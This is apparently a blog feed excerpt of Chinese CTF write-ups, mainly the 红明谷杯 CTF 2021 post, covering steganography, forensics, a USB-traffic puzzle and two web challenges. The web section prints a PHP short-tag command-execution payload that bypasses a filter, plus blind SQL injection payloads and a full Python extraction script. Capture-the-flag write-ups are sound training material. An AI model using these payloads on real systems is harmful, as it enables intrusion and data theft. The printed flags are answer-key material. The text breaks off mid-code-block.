        <content type="html"><![CDATA[<h3 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h3><h4 id="压缩包伪加密修复"><a href="#压缩包伪加密修复" class="headerlink" title="压缩包伪加密修复"></a>压缩包伪加密修复</h4><p>将压缩包中两个文件的 deFlags 都修正为 0 即可解压文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616837996482.0c1302082b4a52b9c38782c04e5ab4b889a89571.png"></p><h4 id="文件结构修正"><a href="#文件结构修正" class="headerlink" title="文件结构修正"></a>文件结构修正</h4><p>使用 010 editor 打开 hint.png 可以发现 IDAT chunk 有一些不对劲，猜测这是两张图片的拼接。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616838152566.c429fda28f9e9952de0d136b02c6b19da2d141d7.png"></p><p>将 IDAT chunk 分开并补全文件头可以得到下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616838199878.d1c1614e32f240c960499445f5d522d9639d940e.png"></p><h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p>使用上述密码对 flag.jpg 使用 outguess 提取内容可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</span><br></pre></td></tr></table></figure><p>使用 CyberChef 对上述信息经过 <code>From Base64 --&gt; From Hex --&gt; Gunzip</code> 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0815e4c9f56148e78be60db56ce44d59&#125;</span><br></pre></td></tr></table></figure><h3 id="雾都孤儿"><a href="#雾都孤儿" class="headerlink" title="雾都孤儿"></a>雾都孤儿</h3><p>使用 <a href="https://www.bertnase.de/npiet/npiet-execute.php">npiet</a> 执行附件中的图片，可以得到如下结果。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617292938118.ed37cb604bdcae59cf5b4e04d8232a395b5a6cb9.png"></p><p>打开附件的 Word 文档可以发现有一张图片，将其从 Word 文档中提取出来，使用 <code>Tetris</code> 做 key 尝试跑 outguess  并将提取出的文件整理后可以得到如下内容。</p><blockquote><p>在线 outguess <a href="https://cyber.meme.tips/joutguess/">https://cyber.meme.tips/joutguess/</a></p></blockquote><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000000010011101010111010000001101100000001010110101010110101011011110000000100011010101000010100110111101010011011010100011011110101001101101010111111001001011011011011001101110110101001101000000010010100101111110101100010101110111101010011011011001101111000000110101101010011010000001111000000111110101011000</span><br></pre></td></tr></table></figure><p>对 Word 文档中的文字进行频数统计，得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(&#39;&#123;&#39;, 6), (&#39;A&#39;, 19), (&#39;m&#39;, 502), (&#39;o&#39;, 1620), (&#39;n&#39;, 1467), (&#39;g&#39;, 406), (&#39; &#39;, 4914), (&#39;t&#39;, 1879), (&#39;h&#39;, 1435), (&#39;e&#39;, 2795), (&#39;r&#39;, 1343), (&#39;p&#39;, 454), (&#39;u&#39;, 567), (&#39;b&#39;, 374), (&#39;l&#39;, 906), (&#39;i&#39;, 1449), (&#39;c&#39;, 507), (&#39;d&#39;, 1017), (&#39;s&#39;, 1254), (&#39;a&#39;, 1806), (&#39;w&#39;, 560), (&#39;,&#39;, 444), (&#39;f&#39;, 457), (&#39;y&#39;, 407), (&#39;I&#39;, 59), (&#39;:&#39;, 15), (&#39;k&#39;, 159), (&#39;;&#39;, 82), (&#39;q&#39;, 26), (&#39;v&#39;, 253), (&#39;x&#39;, 41), (&#39;.&#39;, 254), (&#39;\n&#39;, 190), (&#39;F&#39;, 5), (&#39;&#125;&#39;, 8), (&#39;O&#39;, 51), (&#39;T&#39;, 63), (&#39;-&#39;, 84), (&#39;N&#39;, 13), (&#39;z&#39;, 4), (&quot;&#39;&quot;, 236), (&#39;L&#39;, 7), (&#39;!&#39;, 29), (&#39;S&#39;, 14), (&#39;M&#39;, 84), (&#39;P&#39;, 5), (&#39;Y&#39;, 12), (&#39;_&#39;, 16), (&#39;G&#39;, 3), (&#39;H&#39;, 19), (&#39;?&#39;, 17), (&#39;W&#39;, 22), (&#39;B&#39;, 44), (&#39;U&#39;, 3), (&#39;j&#39;, 7), (&#39;E&#39;, 2), (&#39;(&#39;, 9), (&#39;)&#39;, 9), (&#39;D&#39;, 6), (&#39;J&#39;, 1), (&#39;V&#39;, 1), (&#39;Z&#39;, 1), (&#39;C&#39;, 6)]</span><br></pre></td></tr></table></figure><p>将 outguess 提取出来的字符串使用上述词频进行哈夫曼解码可得 flag。</p><blockquote><p>解码脚本参考：<a href="https://lemonprefect.cn/WriteUps/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20CTF%202021.html#:~:text=%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E6%AE%B5-,%E4%BB%A3%E7%A0%81,-%E8%A7%A3%E7%A0%81%E3%80%82">https://lemonprefect.cn/WriteUps/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20CTF%202021.html#:~:text=%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E6%AE%B5-,%E4%BB%A3%E7%A0%81,-%E8%A7%A3%E7%A0%81%E3%80%82</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;This_Is_Hvffam_Dickens_secret_!!&#125;</span><br></pre></td></tr></table></figure><h3 id="小田的秘密"><a href="#小田的秘密" class="headerlink" title="小田的秘密"></a>小田的秘密</h3><p>使用 WireShark 分析附件给出的流量包，跟踪到 TCP 流 19 可以发现如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617607566438.c726c350e896d5e2762a06933dd00335dc7f55ee.png"></p><p>将其提取出来，可以得到如下一段夹杂着 emoji 的字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐇 🌷 🍇🍉🐇 🌺 🌷 🍇🍉🏁 🍇🍿🔤first🔤 ➡️ 🔤c0f1b6a831c399e2🔤🔤second🔤 ➡️ 🔤9b675bd57058fd46🔤🔤third🔤➡️🔤e6ae2fec3ad71c77🔤🔤fourth🔤 ➡️ 🔤89f58062f10dd731🔤🔤fifth🔤 ➡️ 🔤6316e53c8cdd9d99🔤🍆 ➡️ dic↪️ 🐽dic 🔤first🔤❗️ ➡️ aa 🍇😀 aa❗️🍉😀 🔤+🔤❗️🍿 🔤9ac6133c88aedbd6🔤 🔤26602a67be14ea8c🔤 🔤73b5f8d8ccd5ad31🔤 🔤c42125f82a562231🔤 🍆 ➡️ 🖍️🆕sdasca🐹 sdasca❗️😀 🐽sdasca 0❗️❗️🍉🐇 🐟 🍇🔑 🆕 🍇🍉❗️ 🙋 🍇😀 🔤a109e294d1e8155be8aa4🔤❗️🍉🍉🐇 🐡 🐟 🍇🔑 🆕 🍇 ⤴️🆕❗️ 🍉✒️ ❗️ 🙋 🍇😀 🔤8adf7f2f76030877🔤❗️🍉🍉🐇 🐋 🐟 🍇🔑 🆕 🍇 ⤴️🆕❗️ 🍉✒️ ❗️ 🙋 🍇😀 🔤eba66e10fba74dbf🔤❗️🍉🍉🐇 🐠 🐟 🍇🔑 🆕 🍇 ⤴️🆕❗️ 🍉✒️❗️ 🙋 🍇😀 🔤a7749e813e9e2dba🔤❗️ 🍉🍉</span><br></pre></td></tr></table></figure><p>搜索 <code>🔤🔤third🔤➡️🔤</code> 很容易发现一些关于 Emojicode 相关的参考文章。</p><blockquote><p><a href="https://jaxenter.com/emojicode-the-programming-language-you-should-have-dreamed-of-125169.html">https://jaxenter.com/emojicode-the-programming-language-you-should-have-dreamed-of-125169.html</a></p><p>emojicode/emojicode: <a href="https://github.com/emojicode/emojicode">https://github.com/emojicode/emojicode</a></p><p>Installation: <a href="https://www.emojicode.org/docs/guides/install.html">https://www.emojicode.org/docs/guides/install.html</a></p></blockquote><p>按照其文档安装好编译器并编译上述字符串可以成功运行得到如下结果。（不是的话就多运行几次）</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c0f1b6a831c399e2</span><br><span class="line">+</span><br><span class="line">26602a67be14ea8c</span><br></pre></td></tr></table></figure><p>将其整理一下得到附件中压缩包的解压密码 <code>c0f1b6a831c399e226602a67be14ea8c</code>。解压后可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10?:A&#x3D;356142:GOSUB20:A&#x3D;762:GOSUB20:A&#x3D;222440:GOSUB20:END</span><br><span class="line">20A&#x3D;RND(-A)</span><br><span class="line">30A&#x3D;INT(RND(A)*22):IF A THEN ?CHR$(A+64);:GOTO30</span><br><span class="line">40?&quot; &quot;;:RETURN</span><br><span class="line"></span><br><span class="line">RUN</span><br></pre></td></tr></table></figure><p>使用 Commodore64 模拟器来运行这段代码，得到了结果 <code>NOT AN EGG</code>。</p><blockquote><p>Commodore64 Emulator: <a href="https://floooh.github.io/tiny8bit/c64-ui.html">https://floooh.github.io/tiny8bit/c64-ui.html</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617611975871.00d95c662d9a4d942ada6cacff6fc459af5a4ac0.png"></p><p>使用得到的结果作为密码解压 flag.rar 文件即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6bffd0d9321df3c229cdff714bb5a0b0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红明谷杯 CTF 2021</title>
      <link href="/zh-CN/posts/f33b0bb3.html"/>
      <url>/zh-CN/posts/f33b0bb3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><p>题目给出如下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>?action=pwd</code> 得到当前沙盒路径 <code>sandbox/4e5b09b2149f7619cca155c8bd6d8ee5/</code>。使用 <code>&lt;?=</code> 标签构造出 payload <code>?action=upload&data=&lt;?=&grave;ls%09/&grave;?></code> 之后再访问沙箱路径可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!whatyouwantggggggg401.php bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure><p>构造出 <code>?action=upload&data=&lt;?=&grave;nl%09/!whatyouwantggggggg401.*&grave;?></code> 后再访问沙箱路径查看页面源代码可以发现如下内容，从而可以得到 flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="meta">&lt;?php</span> <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;85d95bb1-3831-4529-8bfa-cc7336c57b27&#125;&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85d95bb1-3831-4529-8bfa-cc7336c57b27&#125;</span><br></pre></td></tr></table></figure><h3 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h3><p>随手注册一个账号登录上去可以发现并没有业务界面，结合题目猜测是 SQL 注入，且注入点在登录或者注册的页面。因此构造出如下 payload 验证得到一个布尔逻辑。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;1&#x2F;**&#x2F;In&#x2F;**&#x2F;(1)#</span><br><span class="line">&amp;password&#x3D;122</span><br></pre></td></tr></table></figure><p>于是尝试读取出数据库名，此时可以发现很多字符被 ban 了。这里记录一下部分遇到的字符。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or,and,&#x3D;,&gt;,&lt;,substr,if,[空格],+,-</span><br></pre></td></tr></table></figure><p>此时可以采用 <code>In (1,2,3...)</code> 的方式来二分盲注，使用 <code>case when ... then ... else ... end</code> 的语法来做逻辑判断。需要注意的是 <code>in</code> 并不是匹配一个区间而是需要穷举，譬如 <code>select (2 in (1,3))</code> 返回的将会是 0，应为此时的 2 既不是 1 也不是 3。因为 <code>substr</code> 被禁用，因此采用 <code>left(reverse(left(&#123;sql&#125;,n)),1)</code> 的办法来读到每一位。此时构造出如下两个 payload 即可验证可行性。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(ascii(left(reverse(left((select&#x2F;**&#x2F;database()),1)),1)))&#x2F;**&#x2F;in&#x2F;**&#x2F;(99)then(cot(0))else(1)end)#</span><br><span class="line">&amp;password&#x3D;122</span><br><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(ascii(left(reverse(left((select&#x2F;**&#x2F;database()),1)),1)))&#x2F;**&#x2F;in&#x2F;**&#x2F;(0)then(cot(0))else(1)end)#</span><br><span class="line">&amp;password&#x3D;122</span><br></pre></td></tr></table></figure><p>写个脚本用二分法查出表名。因为 <code>or</code> 被禁用导致没有 <code>information_schema</code> 可用，此时可以采用 <code>mysql.innodb_table_stats</code> 代替其查出表名。因为无法查出列名，因此采用无列名注入。写个脚本跑出 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;.../login.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    keywords = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># sqlContent = &quot;select/**/database()&quot;.replace(&quot; &quot;, &quot;/**/&quot;)  #ctf</span></span><br><span class="line">            <span class="comment"># sqlContent = &quot;select group_concat(table_name) from mysql.innodb_table_stats&quot;.replace(&quot; &quot;, &quot;/**/&quot;)  #ctf,f1ag,gtid_slave_pos</span></span><br><span class="line">            sqlContent = <span class="string">&quot;select group_concat(b) from (select 1 as b union select * from f1ag)a&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)  <span class="comment">#1,flag&#123;972f6491-7e54-47b1-ada0-639991ecd284&#125;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;nullnull\&quot;/**/||/**/(case/**/when(ascii(left(reverse(left((<span class="subst">&#123;sqlContent&#125;</span>),<span class="subst">&#123;i&#125;</span>)),1)))/**/in/**/(<span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(low, mid + <span class="number">1</span>))).replace(<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;</span>)then(cot(0))else(1)end)#&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = session.post(url=url, data=param)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Username&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        mid_num = <span class="built_in">int</span>((high + low + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        text += <span class="built_in">chr</span>(mid_num)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;972f6491-7e54-47b1-ada0-639991ecd284&#125;</span><br></pre></td></tr></table></figure><h3 id="eztp"><a href="#eztp" class="headerlink" title="eztp"></a>eztp</h3><blockquote><p>ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链：<a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p></blockquote><p><code>.../www.zip</code> 读到源码泄露。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>有手就行的答题。</p><blockquote><p>参考：<a href="https://www.cnitpm.com/pm/32463.html">https://www.cnitpm.com/pm/32463.html</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617358076482.07a4ba821854dd46252e4b024f508e5dc420bddc.png@300w.png"></p><p>在数据库系统中，口令保护是信息系统的第一道屏障。</p><p>为了防止物理上取走数据库而采取的加强数据库安全的方法是数据库加密。</p><p>系统要达到什么样的完整性，取决于系统所处理信息地重要程度、价值和敏感性。</p><p>在数据库的安全评估过程中，可行性是指系统能够对付各种可能地攻击的能力。</p><p>数据库访问控制策略中，只需策略是只让用户得到有相应权限的信息，这些信息恰到可以让用户完成自己的工作，其他的权利一律不给。</p><p>数据库的安全策略是指如何组织、管理、保护和处理敏感信息的指导思想。它包括安全管理策略、访问控制策略和信息控制策略。</p><p>数据库的加密方法中，采用库外加密，则密钥管理较为简单，只需借用文件加密的密钥管理方法。</p><p>在下面的加密方法中，元素加密加解密的效率最低。</p><p>事故故障是指事务在运行至正常终止前被中止，这时恢复子系统应利用日志文件撤销此事物已对数据库进行的修改。</p><p>发生介质故障后，磁盘上的物理数据和日志文件被破坏，这是最严重的一种故障，恢复方法是重装数据库，然后重做已完成的事务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4df9488a-b979-4151-9f15-baa772faab3f&#125;</span><br></pre></td></tr></table></figure><h3 id="InputMonitor"><a href="#InputMonitor" class="headerlink" title="InputMonitor"></a>InputMonitor</h3><blockquote><p>Akira在某次取证的过程中，在桌面找到了一个奇怪的文件，但是除此之外好像没有找到什么有价值的情报，很多的数据都被抹干净了，而且这个用户似乎根本就没装什么第三方的软件。Akira还粗心的只拷贝了C盘下的User目录，这下还有机会解开可疑文件吗？</p></blockquote><p>查看附件中用户 link3 的桌面文件可以发现如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没事，我都删掉了，之前的聊天记录都被我清干净了。除非他们在监控我输入</span><br></pre></td></tr></table></figure><p>此时得知需要分析微软输入法的学习词库，并且可以得到 flag.7z。定向到 <code>%appdata%\Microsoft\InputMethod\Chs</code> 可得 ChsPinyinIH.dat 和 ChsPinyinUDL.dat。使用词库转换文件提取 UDL 文件中的内容可得提示。</p><blockquote><p>studyzy/imewlconverter: <a href="https://github.com/studyzy/imewlconverter">https://github.com/studyzy/imewlconverter</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474546488.deeae47218a5332e33a85e2b3204c5a786ddc960.png"></p><p>此时可知密码是六个字。再将 IH 文件中的内容使用 UTF-16LE 的格式解码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474654580.0da53e45c986f323c9c5e44f2884f07a0e1d47e5.png" alt="image-20210404023052648"></p><p>此时得到压缩包的密码 <code>有志者事竟成</code>。解压压缩包后得到 hidden.pdf 文件。将 PDF 文件使用 Acrobat DC 打开后将图片移开即可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474845995.829b70a6cfa12d47999bdddf033a5c72622023c2.png@300w"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_F1nd_h1dd3n_m3g&#125;</span><br></pre></td></tr></table></figure><h3 id="我的心是冰冰的"><a href="#我的心是冰冰的" class="headerlink" title="我的心是冰冰的"></a>我的心是冰冰的</h3><p>附件直接解压会提示文件头错误，因此直接采用 CyberChef 来提取文件。<code>Extract Files</code> 可以发现有如下图片，将图片和压缩文档下载下来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617475381094.5f933f522524ad736a81bfca551f7d633ed70984.png"></p><p>对提取出的图片使用 Java 盲水印工具提取水印 <code>javaw -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c &#39;.\extracted_at_0x51.jpg&#39; &#39;.\extracted_at_0x51_d.jpg&#39;</code> 可得如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617517178191.1bb1a0be2368cc55cdfd76143e4bd788551d026a.jpg@200w_200h_1c"></p><p>可知压缩包密码为 <code>gnibgnib</code>。解压压缩文件后得到流量包。使用 WireShark 很容易看出是 USB 流量。同时可以发现设备的制造厂商是 <code>Holtek Semiconductor, Inc.</code>。先使用 tshark 将设备的 Leftover Capture Data 给提取出来 <code>tshark.exe -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>，可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 